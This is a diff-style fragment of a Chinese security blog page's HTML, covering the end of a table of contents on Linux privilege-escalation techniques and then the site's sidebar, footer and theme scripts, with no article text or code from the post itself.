class="nav-number">5.</span> <span class="nav-text">小结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">5.1.</span> <span class="nav-text">1.内核漏洞提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-SUID%E6%8F%90%E6%9D%83"><span class="nav-number">5.2.</span> <span class="nav-text">2.SUID提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-sudo%E6%8F%90%E6%9D%83"><span class="nav-number">5.3.</span> <span class="nav-text">3.sudo提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="nav-number">5.4.</span> <span class="nav-text">4.计划任务提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="nav-number">5.5.</span> <span class="nav-text">5. 环境变量提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="nav-number">5.6.</span> <span class="nav-text">6.第三方服务提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#6-1-NFS%E6%8F%90%E6%9D%83"><span class="nav-number">5.6.1.</span> <span class="nav-text">6.1 NFS提权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-2-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-number">5.6.2.</span> <span class="nav-text">6.2 数据库提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">6.</span> <span class="nav-text">References</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mamor"
+      src="/images/kabi.jpg">
+  <p class="site-author-name" itemprop="name">Mamor</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">163</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Mamor5409" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Mamor5409" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.yuque.com/mamor" title="Yuque → https:&#x2F;&#x2F;www.yuque.com&#x2F;mamor" rel="noopener" target="_blank"><i class="yuque fa-fw"></i>Yuque</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mamor</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">755k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:27</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+<!--
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共189.5k字</span>
+</div>
+-->
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/ClickShowText.js"></script>
+
+<script type="text/javascript">
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<a href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+</html>
+
